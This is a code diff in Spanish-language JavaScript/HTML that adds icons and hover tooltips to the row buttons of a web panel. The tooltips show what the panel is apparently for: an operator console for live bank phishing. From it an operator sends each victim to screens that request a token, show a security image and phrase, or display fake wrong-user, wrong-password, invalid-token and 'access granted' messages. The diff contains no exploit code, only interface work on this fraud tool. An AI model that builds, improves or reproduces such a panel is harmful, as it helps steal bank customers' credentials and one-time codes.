@@ -474,14 +474,66 @@ function createRow(row) {
     <td class="col-send" data-label="Envío" data-send-cell></td>
     <td class="col-actions" data-label="Acciones">
       <div class="row-actions">
-        <button type="button" class="btn btn--ok" data-action="ask-token">Pedir token</button>
-        <button type="button" class="btn btn--ok" data-action="send-imagen">Enviar imagen</button>
-        <button type="button" class="btn btn--ok" data-action="c-interna">C.interna</button>
-        <button type="button" class="btn btn--error" data-action="error-tejuino">C.interna error</button>
-        <button type="button" class="btn btn--error" data-action="error-token">Err Token</button>
-        <button type="button" class="btn btn--error" data-action="error-user">Err user</button>
-        <button type="button" class="btn btn--error" data-action="error-pass">Err clave</button>
-        <button type="button" class="btn btn--done" data-action="done">Listo</button>
+        <button type="button" class="btn btn--ok" data-action="ask-token" data-tooltip="Pedir token (Solicitar token al cliente)" title="Pedir token (Solicitar token al cliente)" aria-label="Pedir token">
+          <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+            <circle cx="7.5" cy="15.5" r="4.5"/>
+            <path d="m21 3-9.5 9.5"/>
+            <path d="m15.5 7.5 3 3"/>
+            <path d="m18.5 4.5 2 2"/>
+          </svg>
+        </button>
+        <button type="button" class="btn btn--ok" data-action="send-imagen" data-tooltip="Enviar imagen y frase de seguridad" title="Enviar imagen y frase de seguridad" aria-label="Enviar imagen">
+          <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+            <rect width="18" height="18" x="3" y="3" rx="2" ry="2"/>
+            <circle cx="9" cy="9" r="2"/>
+            <path d="m21 15-3.086-3.086a2 2 0 0 0-2.828 0L6 21"/>
+          </svg>
+        </button>
+        <button type="button" class="btn btn--ok" data-action="c-interna" data-tooltip="Consulta interna (Pantalla de validación / espera)" title="Consulta interna (Pantalla de validación / espera)" aria-label="Consulta interna">
+          <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+            <path d="M21 12a9 9 0 0 0-9-9 9.75 9.75 0 0 0-6.74 2.74L3 8"/>
+            <path d="M3 3v5h5"/>
+            <path d="M3 12a9 9 0 0 0 9 9 9.75 9.75 0 0 0 6.74-2.74L21 16"/>
+            <path d="M16 16h5v5"/>
+          </svg>
+        </button>
+        <button type="button" class="btn btn--error" data-action="error-tejuino" data-tooltip="Error consulta interna (Fallo en pantalla de validación)" title="Error consulta interna (Fallo en pantalla de validación)" aria-label="Error consulta interna">
+          <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+            <path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"/>
+            <line x1="12" y1="9" x2="12" y2="13"/>
+            <line x1="12" y1="17" x2="12.01" y2="17"/>
+          </svg>
+        </button>
+        <button type="button" class="btn btn--error" data-action="error-token" data-tooltip="Error de Token (Token inválido o expirado)" title="Error de Token (Token inválido o expirado)" aria-label="Error de Token">
+          <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+            <circle cx="7.5" cy="15.5" r="4.5"/>
+            <path d="m21 3-9.5 9.5"/>
+            <line x1="15" y1="15" x2="21" y2="21"/>
+            <line x1="21" y1="15" x2="15" y2="21"/>
+          </svg>
+        </button>
+        <button type="button" class="btn btn--error" data-action="error-user" data-tooltip="Error de Usuario (Usuario incorrecto o no existe)" title="Error de Usuario (Usuario incorrecto o no existe)" aria-label="Error de Usuario">
+          <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+            <path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"/>
+            <circle cx="9" cy="7" r="4"/>
+            <line x1="17" y1="8" x2="22" y2="13"/>
+            <line x1="22" y1="8" x2="17" y2="13"/>
+          </svg>
+        </button>
+        <button type="button" class="btn btn--error" data-action="error-pass" data-tooltip="Error de Clave (Contraseña incorrecta)" title="Error de Clave (Contraseña incorrecta)" aria-label="Error de Clave">
+          <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+            <rect width="14" height="10" x="5" y="11" rx="2" ry="2"/>
+            <path d="M8 11V7a4 4 0 0 1 8 0v4"/>
+            <line x1="10" y1="14" x2="14" y2="18"/>
+            <line x1="14" y1="14" x2="10" y2="18"/>
+          </svg>
+        </button>
+        <button type="button" class="btn btn--done" data-action="done" data-tooltip="Listo (Acceso concedido / Finalizar sesión)" title="Listo (Acceso concedido / Finalizar sesión)" aria-label="Listo">
+          <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+            <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/>
+            <polyline points="22 4 12 14.01 9 11.01"/>
+          </svg>
+        </button>
       </div>
     </td>
   `
@@ -766,3 +818,37 @@ hint.textContent = 'Conectando con el servidor…'
 if (isPanelUnlocked()) {
   startPanel()
 }
+
+// Tooltip flotante instantáneo al pasar el mouse / clic por encima
+const globalTooltip = document.createElement('div')
+globalTooltip.className = 'panel-tooltip'
+globalTooltip.hidden = true
+document.body.appendChild(globalTooltip)
+
+document.addEventListener('mouseover', (e) => {
+  const btn = e.target.closest('[data-tooltip]')
+  if (!btn) return
+  const text = btn.getAttribute('data-tooltip')
+  if (!text) return
+  globalTooltip.textContent = text
+  globalTooltip.hidden = false
+  const rect = btn.getBoundingClientRect()
+  const tipRect = globalTooltip.getBoundingClientRect()
+  let top = rect.top - tipRect.height - 8
+  let left = rect.left + rect.width / 2 - tipRect.width / 2
+  if (top < 4) top = rect.bottom + 8
+  if (left < 6) left = 6
+  if (left + tipRect.width > window.innerWidth - 6) {
+    left = window.innerWidth - tipRect.width - 6
+  }
+  globalTooltip.style.top = `${top + window.scrollY}px`
+  globalTooltip.style.left = `${left + window.scrollX}px`
+})
+
+document.addEventListener('mouseout', (e) => {
+  const btn = e.target.closest('[data-tooltip]')
+  if (btn) {
+    globalTooltip.hidden = true
+  }
+})
+
